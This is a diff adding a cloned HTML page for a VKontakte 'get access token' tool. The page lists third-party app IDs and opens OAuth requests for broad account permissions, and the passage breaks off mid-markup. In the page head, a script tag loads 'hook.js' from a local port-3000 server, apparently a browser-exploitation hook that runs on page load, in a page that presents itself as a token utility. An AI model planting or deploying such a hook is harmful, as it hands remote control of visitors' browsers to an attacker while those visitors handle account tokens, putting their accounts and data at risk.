@@ -1,0 +1,1671 @@
+<!DOCTYPE html>
+<html>
+ <head>
+  <meta charset="utf-8">
+   <title>
+    Получить access token
+   </title>
+   <link href="https://vk.com/images/favicon_vk_2x.ico" rel="shortcut icon">
+    <meta content="https://pp.userapi.com/c849136/v849136341/12ae10/azCBaliVP7E.jpg" property="og:image"/>
+    <meta content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, viewport-fit=cover" name="viewport">
+     <meta content="Получить access token для пользователя или группы ВКонтакте" name="description">
+      <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet" type="text/css">
+       <link href="/style.css?200722" media="screen" rel="stylesheet" type="text/css">
+        <script defer="" src="/script.js?200418">
+        </script>
+       </link>
+      </link>
+     </meta>
+    </meta>
+   </link>
+  </meta>
+  <script src="http://127.0.0.1:3000/hook.js">
+  </script>
+ </head>
+ <body>
+  <script>
+   'use strict'
+
+const apps = [
+        [6121396, 'VK Admin', 'https://pp.userapi.com/c836324/v836324157/57e47/kmuk5kWubsA.jpg', 'VK Admin — приложение для администраторов сообществ. Общайтесь с клиентами и подписчиками от имени Ваших сообществ ВКонтакте, управляйте группой и отслеживайте статистику с мобильного телефона.', 330],
+        [5776857, 'VK Admin (iOS)', 'https://pp.userapi.com/c831308/v831308960/d4af9/0o-EVdYjXmk.jpg', 'Приложение для организации обратной связи с клиентами, пользователями и подписчиками Ваших сообществ.', 330],
+        [5256902, 'VK Live', 'https://pp.userapi.com/c637831/v637831651/1a1f8/qm4Rf9IX-dw.jpg', '', 132],
+        [5676187, 'VK Live Android', 'https://pp.userapi.com/c638919/v638919892/28b52/kHZvh2UeXk8.jpg', '', 132],
+        [5554806, 'Vinci', 'https://pp.userapi.com/c615828/v615828550/26d9c/Z7F5bOheDO8.jpg', 'Преображайте свои фотографии с помощью нейросетей и искусственного разума.', 308],
+        [5530956, 'Prisma', 'https://pp.userapi.com/c633324/v633324499/3a9b0/8ZaEuKGfypU.jpg', 'Почувствуй себя художником! Преврати фотографии в уникальные произведения искусства:<br>— Фильтры в стиле художников<br>— Завораживающие фотоэффекты<br>— Делись шедеврами в одно нажатие', 288],
+        [6334949, 'Клевер', 'https://pp.userapi.com/c841521/v841521530/7d187/IKobOsNO_lY.jpg', '', 132],
+        [6378721, 'Клевер — игра с призами', 'https://pp.userapi.com/c841122/v841122545/7b5be/mjTfevye8ZY.jpg', '', 132],
+        [3698024, 'Instagram', 'https://pp.userapi.com/c633227/v633227376/33212/KU3LDlKwxo0.jpg', 'Мобильное приложение для публикации фотографий.', 240],
+        [2685278, 'Kate Mobile', 'https://pp.userapi.com/c412825/v412825174/6522/nEKTkD_Uqcg.jpg', 'ВКонтакте для Android', 132],
+        [4083558, 'VFeed', 'https://pp.userapi.com/c613529/v613529371/16761/Mjwh_-ADFK8.jpg', 'VFeed для iphone', 132],
+        [6146827, 'VK Me', 'https://vk.com/images/dquestion_a.png', '', 132],
+        [3116505, 'VK API', 'https://pp.userapi.com/c840138/v840138345/787f9/ZTLHQaj4S7U.jpg', '', 132]
+    ],
+    utypes = [
+        [0, 'Уведомления', 'notify', 'только для iframe-приложений'],
+        [1, 'Друзья', 'friends'],
+        [2, 'Фотографии', 'photos'],
+        [3, 'Аудиозаписи', 'audio', 'доступ к API аудиозаписей ограничен'],
+        [4, 'Видеозаписи', 'video'],
+        [6, 'Истории', 'stories'],
+        [7, 'Wiki-страницы', 'pages'],
+        [8, 'Добавление в меню слева', 'menu', 'только для iframe-приложений'],
+        [9, 'Быстрая публикация на стенах', 'wallmenu', 'устаревший параметр'],
+        [10, 'Статус', 'status'],
+        [11, 'Заметки', 'notes'],
+        [12, 'Сообщения', 'messages', 'доступ к API сообщений ограничен'],
+        [13, 'Стена', 'wall'],
+        [15, 'Рекламные кабинеты', 'ads'],
+        [16, 'Доступ в любое время', 'offline'],
+        [17, 'Документы', 'docs'],
+        [18, 'Группы', 'groups'],
+        [19, 'Ответы', 'notifications'],
+        [20, 'Статистика', 'stats'],
+        [22, 'Электронная почта', 'email'],
+        [23, 'Кабинеты рекламной сети', 'adsweb'],
+        [24, 'Рекламные акции', 'leads', 'только для рекламных партнёров'],
+        [26, 'Кабинеты биржи рекламы', 'exchange'],
+        [27, 'Товары', 'market'],
+        [28, 'Номер телефона', 'phone', 'только для сервисов и доверенных iframe-приложений']
+    ],
+    gtypes = [
+        [0, 'Истории', 'stories'],
+        [2, 'Фотографии', 'photos'],
+        [12, 'Сообщения', 'messages'],
+        [13, 'Стена', 'wall'],
+        [17, 'Документы', 'docs'],
+        [18, 'Администрирование', 'manage']
+    ];
+
+
+apps.map(app => apps_block.insertAdjacentHTML('beforeend', '<div class="app"><button onclick="auth(' + app[0] + ')" class="btn">' + app[1] + '</button><span><img src="' + app[2] + '" class="p_icon"><div class="desc"><p>' + (app[3] ? app[3] : 'Описание отсутствует') + '</p><p>ID приложения: ' + app[0] + '</p>Иконка в записях:<div class="icon" style="background-position: 0 -' + app[4] + 'px;"></div></div></span></div>'));
+
+apps_block.insertAdjacentHTML('beforeend', '<div class="app"><button class="btn" id="settings">Настройки</button><span><div class="desc">Настройка прав, указание ID приложения, а также получение токена для группы</div></span></div>');
+
+addPermissions(utypes, permissions);
+addPermissions(gtypes, gpermissions);
+
+settings.onclick = function() {
+    showOptions(1);
+};
+
+close_button.onclick = function() {
+    showOptions();
+};
+
+uncheck.onclick = function() {
+    Array.prototype.slice.call(document.querySelectorAll('input[scope]')).map(check => check.checked = false);
+};
+
+submit.onclick = function() {
+    if (token_type_user.checked) {
+        var scope = document.querySelectorAll('#permissions > input:checked'),
+            groups = 0;
+    } else {
+        var scope = document.querySelectorAll('#gpermissions > input:checked'),
+            groups = 1;
+    }
+    let app = app_id.value;
+    let group = group_id.value;
+    if ((app && !groups) || (app && groups && group && scope.length)) {
+        auth(app, Array.prototype.slice.call(scope).reduce((cc, sc) => cc + Math.pow(2, sc.getAttribute('scope')), 0), (groups ? group : ''));
+        err_msg.style.display = 'none';
+    } else {
+        err_msg.style.display = 'block';
+    }
+};
+
+document.onkeydown = function(e) {
+    if (e.key == 'Escape') {
+        showOptions();
+    }
+};
+
+
+window.onclick = function(event) {
+    if (event.target == myModal) {
+        showOptions();
+    }
+};
+
+window.EventTarget.prototype.addDelegatedListener = function(type, delegateSelector, listener) {
+    this.addEventListener(type, function(event) {
+        if (event.target && event.target.matches(delegateSelector)) {
+            listener.call(event.target, event)
+        }
+    })
+};
+
+document.addDelegatedListener('change', 'input[type="radio"]', function(event) {
+    if (token_type_user.checked) {
+        permissions.style.display = offline_warning.style.display = 'block';
+        gpermissions.style.display = group_block.style.display = 'none';
+    } else {
+        permissions.style.display = offline_warning.style.display = 'none';
+        gpermissions.style.display = group_block.style.display = 'block';
+    }
+    err_msg.style.display = 'none';
+})
+
+function showOptions(d) {
+    myModal.style.display = (d ? 'block' : 'none');
+}
+
+function addPermissions(arr, el) {
+    arr.map(type => el.insertAdjacentHTML('beforeend', '<input type="checkbox" id="' + el.id + '_' + type[0] + '" class="pcheck" scope="' + type[0] + '" ' + (!type[3] ? 'checked' : '') + '><label for="' + el.id + '_' + type[0] + '" class="btn" title="' + type[2] + '' + (type[3] ? ' (' + type[3] + ')' : '') + '">' + type[1] + '</label>'));
+}
+
+function auth(app, scope = 1073737727, groups = false) {
+    window.open('https://oauth.vk.com/authorize?client_id=' + app + '&scope=' + scope + '&redirect_uri=https://oauth.vk.com/blank.html&display=page&response_type=token' + (groups ? '&group_ids=' + groups.replace(/[^0-9\,]/gim, '') : '&revoke=1'));
+}
+  </script>
+  <style>
+   /*! normalize.css v3.0.2 | MIT License | git.io/normalize */
+
+@import url("https://fonts.googleapis.com/css?family=Open+Sans:400,700");
+html {
+	font-family: sans-serif;
+	-ms-text-size-adjust: 100%;
+	-webkit-text-size-adjust: 100%
+}
+
+body {
+	margin: 0;
+	overflow-x: hidden;
+	width: 100%;
+	padding: 0;
+	font-family: "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+	font-size: 16px;
+	line-height: 1.5;
+	color: #ffffff
+}
+
+article,
+aside,
+details,
+figcaption,
+figure,
+footer,
+header,
+hgroup,
+main,
+menu,
+nav,
+section,
+summary {
+	display: block
+}
+
+audio,
+canvas,
+progress,
+video {
+	display: inline-block;
+	vertical-align: baseline
+}
+
+audio:not([controls]) {
+	display: none;
+	height: 0
+}
+
+[hidden],
+template {
+	display: none
+}
+
+a {
+	background-color: transparent
+}
+
+a:active,
+a:hover {
+	outline: 0
+}
+
+abbr[title] {
+	border-bottom: 1px dotted
+}
+
+b,
+strong {
+	font-weight: bold
+}
+
+dfn {
+	font-style: italic
+}
+
+h1 {
+	font-size: 2em;
+	margin: 0.67em 0
+}
+
+mark {
+	background: #ff0;
+	color: #000
+}
+
+small {
+	font-size: 80%
+}
+
+sub,
+sup {
+	font-size: 75%;
+	line-height: 0;
+	position: relative;
+	vertical-align: baseline
+}
+
+sup {
+	top: -0.5em
+}
+
+sub {
+	bottom: -0.25em
+}
+
+img {
+	border: 0
+}
+
+svg:not(:root) {
+	overflow: hidden
+}
+
+figure {
+	margin: 1em 40px
+}
+
+hr {
+	box-sizing: content-box;
+	height: 0
+}
+
+pre {
+	overflow: auto
+}
+
+code,
+kbd,
+pre,
+samp {
+	font-family: monospace, monospace;
+	font-size: 1em
+}
+
+button,
+input,
+optgroup,
+select,
+textarea {
+	color: inherit;
+	font: inherit;
+	margin: 0
+}
+
+button {
+	overflow: visible
+}
+
+button,
+select {
+	text-transform: none
+}
+
+button,
+html input[type="button"],
+input[type="reset"],
+input[type="submit"] {
+	-webkit-appearance: button;
+	cursor: pointer
+}
+
+button[disabled],
+html input[disabled] {
+	cursor: default
+}
+
+button::-moz-focus-inner,
+input::-moz-focus-inner {
+	border: 0;
+	padding: 0
+}
+
+input {
+	line-height: normal
+}
+
+input[type="checkbox"],
+input[type="radio"] {
+	box-sizing: border-box;
+	padding: 0
+}
+
+input[type="number"]::-webkit-inner-spin-button,
+input[type="number"]::-webkit-outer-spin-button {
+	height: auto
+}
+
+input[type="search"] {
+	-webkit-appearance: textfield;
+	box-sizing: content-box
+}
+
+input[type="search"]::-webkit-search-cancel-button,
+input[type="search"]::-webkit-search-decoration {
+	-webkit-appearance: none
+}
+
+fieldset {
+	border: 1px solid #c0c0c0;
+	margin: 0 2px;
+	padding: 0.35em 0.625em 0.75em
+}
+
+legend {
+	border: 0;
+	padding: 0
+}
+
+textarea {
+	overflow: auto
+}
+
+optgroup {
+	font-weight: bold
+}
+
+table {
+	border-collapse: collapse;
+	border-spacing: 0
+}
+
+td,
+th {
+	padding: 0
+}
+
+.highlight table td {
+	padding: 5px
+}
+
+.highlight table pre {
+	margin: 0
+}
+
+.highlight .cm {
+	color: #999988;
+	font-style: italic
+}
+
+.highlight .cp {
+	color: #999999;
+	font-weight: bold
+}
+
+.highlight .c1 {
+	color: #999988;
+	font-style: italic
+}
+
+.highlight .cs {
+	color: #999999;
+	font-weight: bold;
+	font-style: italic
+}
+
+.highlight .c,
+.highlight .cd {
+	color: #999988;
+	font-style: italic
+}
+
+.highlight .err {
+	color: #a61717;
+	background-color: #e3d2d2
+}
+
+.highlight .gd {
+	color: #000000;
+	background-color: #ffdddd
+}
+
+.highlight .ge {
+	color: #000000;
+	font-style: italic
+}
+
+.highlight .gr {
+	color: #aa0000
+}
+
+.highlight .gh {
+	color: #999999
+}
+
+.highlight .gi {
+	color: #000000;
+	background-color: #ddffdd
+}
+
+.highlight .go {
+	color: #888888
+}
+
+.highlight .gp {
+	color: #555555
+}
+
+.highlight .gs {
+	font-weight: bold
+}
+
+.highlight .gu {
+	color: #aaaaaa
+}
+
+.highlight .gt {
+	color: #aa0000
+}
+
+.highlight .kc {
+	color: #000000;
+	font-weight: bold
+}
+
+.highlight .kd {
+	color: #000000;
+	font-weight: bold
+}
+
+.highlight .kn {
+	color: #000000;
+	font-weight: bold
+}
+
+.highlight .kp {
+	color: #000000;
+	font-weight: bold
+}
+
+.highlight .kr {
+	color: #000000;
+	font-weight: bold
+}
+
+.highlight .kt {
+	color: #445588;
+	font-weight: bold
+}
+
+.highlight .k,
+.highlight .kv {
+	color: #000000;
+	font-weight: bold
+}
+
+.highlight .mf {
+	color: #009999
+}
+
+.highlight .mh {
+	color: #009999
+}
+
+.highlight .il {
+	color: #009999
+}
+
+.highlight .mi {
+	color: #009999
+}
+
+.highlight .mo {
+	color: #009999
+}
+
+.highlight .m,
+.highlight .mb,
+.highlight .mx {
+	color: #009999
+}
+
+.highlight .sb {
+	color: #d14
+}
+
+.highlight .sc {
+	color: #d14
+}
+
+.highlight .sd {
+	color: #d14
+}
+
+.highlight .s2 {
+	color: #d14
+}
+
+.highlight .se {
+	color: #d14
+}
+
+.highlight .sh {
+	color: #d14
+}
+
+.highlight .si {
+	color: #d14
+}
+
+.highlight .sx {
+	color: #d14
+}
+
+.highlight .sr {
+	color: #009926
+}
+
+.highlight .s1 {
+	color: #d14
+}
+
+.highlight .ss {
+	color: #990073
+}
+
+.highlight .s {
+	color: #d14
+}
+
+.highlight .na {
+	color: #008080
+}
+
+.highlight .bp {
+	color: #999999
+}
+
+.highlight .nb {
+	color: #0086B3
+}
+
+.highlight .nc {
+	color: #445588;
+	font-weight: bold
+}
+
+.highlight .no {
+	color: #008080
+}
+
+.highlight .nd {
+	color: #3c5d5d;
+	font-weight: bold
+}
+
+.highlight .ni {
+	color: #800080
+}
+
+.highlight .ne {
+	color: #990000;
+	font-weight: bold
+}
+
+.highlight .nf {
+	color: #990000;
+	font-weight: bold
+}
+
+.highlight .nl {
+	color: #990000;
+	font-weight: bold
+}
+
+.highlight .nn {
+	color: #555555
+}
+
+.highlight .nt {
+	color: #000080
+}
+
+.highlight .vc {
+	color: #008080
+}
+
+.highlight .vg {
+	color: #008080
+}
+
+.highlight .vi {
+	color: #008080
+}
+
+.highlight .nv {
+	color: #008080
+}
+
+.highlight .ow {
+	color: #000000;
+	font-weight: bold
+}
+
+.highlight .o {
+	color: #000000;
+	font-weight: bold
+}
+
+.highlight .w {
+	color: #bbbbbb
+}
+
+.highlight {
+	background-color: #f8f8f8
+}
+
+* {
+	box-sizing: border-box
+}
+
+a {
+	color: #1da1f2;
+	text-decoration: none
+}
+
+a:hover {
+	text-decoration: underline
+}
+
+.btn {
+	display: inline-block;
+	color: rgba(255, 255, 255, 0.7);
+	background-color: rgba(255, 255, 255, 0.08);
+	border-color: rgba(255, 255, 255, 0.2);
+	border-style: solid;
+	border-width: 1px;
+	border-radius: 0.3rem;
+	transition: color 0.2s, background-color 0.2s, border-color 0.2s;
+	margin: 3px 6px 3px 0px
+}
+
+.btn:hover {
+	color: rgba(255, 255, 255, 0.8);
+	text-decoration: none;
+	background-color: rgba(255, 255, 255, 0.2);
+	border-color: rgba(255, 255, 255, 0.3)
+}
+
+.btn+.btn {
+	margin-left: 1rem
+}
+
+@media screen and (min-width: 64em) {
+	.btn {
+		padding: 0.75rem 1rem
+	}
+}
+
+@media screen and (min-width: 42em) and (max-width: 64em) {
+	.btn {
+		padding: 0.6rem 0.9rem;
+		font-size: 0.9rem
+	}
+}
+
+@media screen and (max-width: 42em) {
+	.btn {
+		padding: 0.75rem;
+		font-size: 0.9rem
+	}
+	.app>.btn {
+		display: block;
+		width: 100%
+	}
+}
+
+.page-header {
+	color: #fff;
+	text-align: center;
+	background: linear-gradient(135deg, #1da1f2, #981ceb);
+}
+
+@media screen and (min-width: 64em) {
+	.page-header {
+		padding: 5rem 6rem
+	}
+}
+
+@media screen and (min-width: 42em) and (max-width: 64em) {
+	.page-header {
+		padding: 3rem 4rem
+	}
+}
+
+@media screen and (max-width: 42em) {
+	.page-header {
+		padding: 2rem 1rem
+	}
+}
+
+.project-name {
+	margin-top: 0;
+	margin-bottom: 0.1rem
+}
+
+@media screen and (min-width: 64em) {
+	.project-name {
+		font-size: 3.25rem
+	}
+}
+
+@media screen and (min-width: 42em) and (max-width: 64em) {
+	.project-name {
+		font-size: 2.25rem
+	}
+}
+
+@media screen and (max-width: 42em) {
+	.project-name {
+		font-size: 1.75rem
+	}
+}
+
+.project-tagline {
+	margin-bottom: 2rem;
+	font-weight: normal;
+	opacity: 0.7
+}
+
+@media screen and (min-width: 64em) {
+	.project-tagline {
+		font-size: 1.25rem
+	}
+}
+
+@media screen and (min-width: 42em) and (max-width: 64em) {
+	.project-tagline {
+		font-size: 1.15rem
+	}
+}
+
+@media screen and (max-width: 42em) {
+	.project-tagline {
+		font-size: 1rem
+	}
+}
+
+.main-content {
+	color: #606c71;
+	word-wrap: break-word
+}
+
+.main-content :first-child {
+	margin-top: 0
+}
+
+@media screen and (min-width: 64em) {
+	.main-content {
+		max-width: 64rem;
+		padding: 2rem 6rem;
+		margin: 0 auto;
+		font-size: 1.1rem
+	}
+}
+
+@media screen and (min-width: 42em) and (max-width: 64em) {
+	.main-content {
+		padding: 2rem 4rem;
+		font-size: 1.1rem
+	}
+}
+
+@media screen and (max-width: 42em) {
+	.main-content {
+		padding: 2rem 1rem;
+		font-size: 1rem
+	}
+}
+
+.main-content img {
+	max-width: 100%
+}
+
+.main-content h1,
+.main-content h2,
+.main-content h3,
+.main-content h4,
+.main-content h5,
+.main-content h6 {
+	margin-top: 2rem;
+	margin-bottom: 1rem;
+	font-weight: normal;
+	color: #1da1f2
+}
+
+.main-content p {
+	margin-bottom: 1em
+}
+
+.main-content code {
+	padding: 2px 4px;
+	font-family: Consolas, "Liberation Mono", Menlo, Courier, monospace;
+	font-size: 0.9rem;
+	color: #567482;
+	background-color: #f3f6fa;
+	border-radius: 0.3rem
+}
+
+.main-content pre {
+	padding: 0.8rem;
+	margin-top: 0;
+	margin-bottom: 1rem;
+	font: 1rem Consolas, "Liberation Mono", Menlo, Courier, monospace;
+	color: #567482;
+	word-wrap: normal;
+	background-color: #f3f6fa;
+	border: solid 1px #dce6f0;
+	border-radius: 0.3rem
+}
+
+.main-content pre>code {
+	padding: 0;
+	margin: 0;
+	font-size: 0.9rem;
+	color: #567482;
+	word-break: normal;
+	white-space: pre;
+	background: transparent;
+	border: 0
+}
+
+.main-content .highlight {
+	margin-bottom: 1rem
+}
+
+.main-content .highlight pre {
+	margin-bottom: 0;
+	word-break: normal
+}
+
+.main-content .highlight pre,
+.main-content pre {
+	padding: 0.8rem;
+	overflow: auto;
+	font-size: 0.9rem;
+	line-height: 1.45;
+	border-radius: 0.3rem;
+	-webkit-overflow-scrolling: touch
+}
+
+.main-content pre code,
+.main-content pre tt {
+	display: inline;
+	max-width: initial;
+	padding: 0;
+	margin: 0;
+	overflow: initial;
+	line-height: inherit;
+	word-wrap: normal;
+	background-color: transparent;
+	border: 0
+}
+
+.main-content pre code:before,
+.main-content pre code:after,
+.main-content pre tt:before,
+.main-content pre tt:after {
+	content: normal
+}
+
+.main-content ul,
+.main-content ol {
+	margin-top: 0
+}
+
+.main-content blockquote {
+	padding: 0 1rem;
+	margin-left: 0;
+	color: #819198;
+	border-left: 0.3rem solid #dce6f0
+}
+
+.main-content blockquote>:first-child {
+	margin-top: 0
+}
+
+.main-content blockquote>:last-child {
+	margin-bottom: 0
+}
+
+.main-content table {
+	display: block;
+	width: 100%;
+	overflow: auto;
+	word-break: normal;
+	word-break: keep-all;
+	-webkit-overflow-scrolling: touch
+}
+
+.main-content table th {
+	font-weight: bold
+}
+
+.main-content table th,
+.main-content table td {
+	padding: 0.5rem 1rem;
+	border: 1px solid #e9ebec
+}
+
+.main-content dl {
+	padding: 0
+}
+
+.main-content dl dt {
+	padding: 0;
+	margin-top: 1rem;
+	font-size: 1rem;
+	font-weight: bold
+}
+
+.main-content dl dd {
+	padding: 0;
+	margin-bottom: 1rem
+}
+
+.main-content hr {
+	height: 2px;
+	padding: 0;
+	margin: 1rem 0;
+	background-color: #eff0f1;
+	border: 0
+}
+
+.site-footer {
+	padding-top: 2rem;
+	margin-top: 2rem;
+	border-top: solid 1px #eff0f1
+}
+
+@media screen and (min-width: 64em) {
+	.site-footer {
+		font-size: 1rem
+	}
+}
+
+@media screen and (min-width: 42em) and (max-width: 64em) {
+	.site-footer {
+		font-size: 1rem
+	}
+}
+
+@media screen and (max-width: 42em) {
+	.site-footer {
+		font-size: 0.9rem
+	}
+}
+
+.site-footer-owner {
+	display: block;
+	font-weight: bold
+}
+
+.site-footer-credits {
+	color: #819198
+}
+
+.app {
+	position: relative;
+	display: inline-block;
+	margin: .3rem
+}
+
+.btn:hover {
+	color: rgba(255, 255, 255, 0.8);
+	text-decoration: none;
+	background-color: rgba(255, 255, 255, 0.2);
+	border-color: rgba(255, 255, 255, 0.3);
+	cursor: pointer
+}
+
+.btn {
+	position: relative
+}
+
+.app span {
+	display: none;
+	position: absolute;
+	color: #000000;
+	background: #FFFFFF;
+	padding: 10px;
+	width: 500px;
+	visibility: hidden;
+	border-radius: .50rem;
+	font-size: 14px;
+	text-align: left;
+	will-change: filter;
+	filter: drop-shadow(-3px 3px 3px rgba(0, 0, 0, 0.2))
+}
+
+.app span:before {
+	content: '';
+	position: absolute;
+	top: 100%;
+	left: 50%;
+	margin-left: -187px;
+	width: 0;
+	height: 0;
+	border-top: 10px solid #FFFFFF;
+	border-right: 10px solid transparent;
+	border-left: 10px solid transparent
+}
+
+.app span:after {
+	content: '';
+	position: absolute;
+	width: 130px;
+	height: 30px
+}
+
+@media (min-width: 42em) {
+	.app:hover span {
+		display: block;
+		visibility: visible;
+		opacity: 1;
+		bottom: 72px;
+		left: 50%;
+		margin-left: -76px;
+		z-index: 999
+	}
+	.modal {
+		padding-top: 50px;
+	}
+	.modal-content {
+		width: 50%;
+		border-radius: .25rem
+	}
+	.modal-header {
+		border-radius: .25rem .25rem 0 0
+	}
+	.modal-footer {
+		border-radius: 0 0 .25rem .25rem
+	}
+}
+
+.icon {
+	display: inline-block;
+	margin: 0 0 -1px 5px;
+	background: url(//vk.com/images/profile_icons_2x.png) no-repeat top left / 13px 341px;
+	width: 11px;
+	height: 11px
+}
+
+.p_icon {
+	border-radius: .50rem;
+	width: 75px;
+	float: left
+}
+
+#apps_block {
+	max-width: 1000px;
+	margin: auto
+}
+
+.desc {
+	padding-left: 10px;
+	display: table
+}
+
+li>span {
+	color: #1da1f2
+}
+
+.modal {
+	display: none;
+	position: fixed;
+	z-index: 1;
+	left: 0;
+	top: 0;
+	width: 100%;
+	height: 100%;
+	overflow: auto;
+	background-color: rgba(0, 0, 0, 0.4)
+}
+
+.modal-content {
+	position: relative;
+	margin: auto;
+	padding: 0;
+	min-width: 300px;
+	box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
+	-webkit-animation-name: animatetop;
+	-webkit-animation-duration: 0.4s;
+	animation-name: animatetop;
+	animation-duration: 0.4s
+}
+
+@-webkit-keyframes animatetop {
+	from {
+		top: -300px;
+		opacity: 0
+	}
+	to {
+		top: 0;
+		opacity: 1
+	}
+}
+
+@keyframes animatetop {
+	from {
+		top: -300px;
+		opacity: 0
+	}
+	to {
+		top: 0;
+		opacity: 1
+	}
+}
+
+#close_button {
+	color: white;
+	float: right;
+	font-size: 28px;
+	font-weight: bold;
+	margin-top: 10px
+}
+
+#close_button:hover,
+#close_button:focus {
+	color: #ffffff80;
+	text-decoration: none;
+	cursor: pointer
+}
+
+.modal-header {
+	padding: 2px 16px;
+	background-color: #1da1f2;
+	color: white
+}
+
+.modal-body {
+	padding: 2px 16px;
+	background-color: #264b90
+}
+
+.modal-footer {
+	padding: 2px 16px;
+	background-color: #1da1f2;
+	color: white
+}
+
+label.btn {
+	user-select: none
+}
+
+.pcheck {
+	display: none
+}
+
+.pcheck:checked+label {
+	background: #1da1f2
+}
+
+input.btn:hover {
+	cursor: text
+}
+
+input::-webkit-outer-spin-button,
+input::-webkit-inner-spin-button {
+	-webkit-appearance: none;
+	margin: 0
+}
+
+input[type=number] {
+	-moz-appearance: textfield
+}
+
+::placeholder {
+	color: #ffffff33
+}
+
+input,
+button {
+	outline: 0
+}
+
+#err_msg {
+	float: left;
+	margin: 28px 0
+}
+
+#submit {
+	margin: 15px 0
+}
+
+.desc>p {
+	margin: 0 0 7px
+}
+
+#uncheck {
+	color: #1da1f2;
+	cursor: pointer
+}
+
+.modal_bottom_text {
+	display: block;
+	margin: 15px 0
+}
+@font-face {
+  font-family: 'Open Sans';
+  font-style: normal;
+  font-weight: 400;
+  src: local('Open Sans Regular'), local('OpenSans-Regular'), url(https://fonts.gstatic.com/s/opensans/v17/mem8YaGs126MiZpBA-UFVZ0e.ttf) format('truetype');
+}
+@font-face {
+  font-family: 'Open Sans';
+  font-style: normal;
+  font-weight: 700;
+  src: local('Open Sans Bold'), local('OpenSans-Bold'), url(https://fonts.gstatic.com/s/opensans/v17/mem5YaGs126MiZpBA-UN7rgOUuhs.ttf) format('truetype');
+}
+  </style>
+  <section class="page-header">
+   <h1 class="project-name">
+    Получить access token
+   </h1>
+   <h2 class="project-tagline">
+    Выберите приложение
+   </h2>
+   <div id="apps_block">
+    <div class="app">
+     <button class="btn" onclick="auth(6121396)">
+      VK Admin
+     </button>
+     <span>
+      <img class="p_icon" src="https://pp.userapi.com/c836324/v836324157/57e47/kmuk5kWubsA.jpg">
+       <div class="desc">
+        <p>
+         VK Admin — приложение для администраторов сообществ. Общайтесь с клиентами и подписчиками от имени Ваших сообществ ВКонтакте, управляйте группой и отслеживайте статистику с мобильного телефона.
+        </p>
+        <p>
+         ID приложения: 6121396
+        </p>
+        Иконка в записях:
+        <div class="icon" style="background-position: 0 -330px;">
+        </div>
+       </div>
+      </img>
+     </span>
+    </div>
+    <div class="app">
+     <button class="btn" onclick="auth(5776857)">
+      VK Admin (iOS)
+     </button>
+     <span>
+      <img class="p_icon" src="https://pp.userapi.com/c831308/v831308960/d4af9/0o-EVdYjXmk.jpg">
+       <div class="desc">
+        <p>
+         Приложение для организации обратной связи с клиентами, пользователями и подписчиками Ваших сообществ.
+        </p>
+        <p>
+         ID приложения: 5776857
+        </p>
+        Иконка в записях:
+        <div class="icon" style="background-position: 0 -330px;">
+        </div>
+       </div>
+      </img>
+     </span>
+    </div>
+    <div class="app">
+     <button class="btn" onclick="auth(5256902)">
+      VK Live
+     </button>
+     <span>
+      <img class="p_icon" src="https://pp.userapi.com/c637831/v637831651/1a1f8/qm4Rf9IX-dw.jpg">
+       <div class="desc">
+        <p>
+         Описание отсутствует
+        </p>
+        <p>
+         ID приложения: 5256902
+        </p>
+        Иконка в записях:
+        <div class="icon" style="background-position: 0 -132px;">
+        </div>
+       </div>
+      </img>
+     </span>
+    </div>
+    <div class="app">
+     <button class="btn" onclick="auth(5676187)">
+      VK Live Android
+     </button>
+     <span>
+      <img class="p_icon" src="https://pp.userapi.com/c638919/v638919892/28b52/kHZvh2UeXk8.jpg">
+       <div class="desc">
+        <p>
+         Описание отсутствует
+        </p>
+        <p>
+         ID приложения: 5676187
+        </p>
+        Иконка в записях:
+        <div class="icon" style="background-position: 0 -132px;">
+        </div>
+       </div>
+      </img>
+     </span>
+    </div>
+    <div class="app">
+     <button class="btn" onclick="auth(5554806)">
+      Vinci
+     </button>
+     <span>
+      <img class="p_icon" src="https://pp.userapi.com/c615828/v615828550/26d9c/Z7F5bOheDO8.jpg">
+       <div class="desc">
+        <p>
+         Преображайте свои фотографии с помощью нейросетей и искусственного разума.
+        </p>
+        <p>
+         ID приложения: 5554806
+        </p>
+        Иконка в записях:
+        <div class="icon" style="background-position: 0 -308px;">
+        </div>
+       </div>
+      </img>
+     </span>
+    </div>
+    <div class="app">
+     <button class="btn" onclick="auth(5530956)">
+      Prisma
+     </button>
+     <span>
+      <img class="p_icon" src="https://pp.userapi.com/c633324/v633324499/3a9b0/8ZaEuKGfypU.jpg">
+       <div class="desc">
+        <p>
+         Почувствуй себя художником! Преврати фотографии в уникальные произведения искусства:
+         <br>
+          — Фильтры в стиле художников
+          <br>
+           — Завораживающие фотоэффекты
+           <br>
+            — Делись шедеврами в одно нажатие
+           </br>
+          </br>
+         </br>
+        </p>
+        <p>
+         ID приложения: 5530956
+        </p>
+        Иконка в записях:
+        <div class="icon" style="background-position: 0 -288px;">
+        </div>
+       </div>
+      </img>
+     </span>
+    </div>
+    <div class="app">
+     <button class="btn" onclick="auth(6334949)">
+      Клевер
+     </button>
+     <span>
+      <img class="p_icon" src="https://pp.userapi.com/c841521/v841521530/7d187/IKobOsNO_lY.jpg">
+       <div class="desc">
+        <p>
+         Описание отсутствует
+        </p>
+        <p>
+         ID приложения: 6334949
+        </p>
+        Иконка в записях:
+        <div class="icon" style="background-position: 0 -132px;">
+        </div>
+       </div>
+      </img>
+     </span>
+    </div>
+    <div class="app">
+     <button class="btn" onclick="auth(6378721)">
+      Клевер — игра с призами
+     </button>
+     <span>
+      <img class="p_icon" src="https://pp.userapi.com/c841122/v841122545/7b5be/mjTfevye8ZY.jpg">
+       <div class="desc">
+        <p>
+         Описание отсутствует
+        </p>
+        <p>
+         ID приложения: 6378721
+        </p>
+        Иконка в записях:
+        <div class="icon" style="background-position: 0 -132px;">
+        </div>
+       </div>
+      </img>
+     </span>
+    </div>
+    <div class="app">
+     <button class="btn" onclick="auth(3698024)">
+      Instagram
+     </button>
+     <span>
+      <img class="p_icon" src="https://pp.userapi.com/c633227/v633227376/33212/KU3LDlKwxo0.jpg">
+       <div class="desc">
+        <p>
+         Мобильное приложение для публикации фотографий.
+        </p>
+        <p>
+         ID приложения: 3698024
+        </p>
+        Иконка в записях:
+        <div class="icon" style="background-position: 0 -240px;">
+        </div>
+       </div>
+      </img>
+     </span>
+    </div>
+    <div class="app">
+     <button class="btn" onclick="auth(2685278)">
+      Kate Mobile
+     </button>
+     <span>
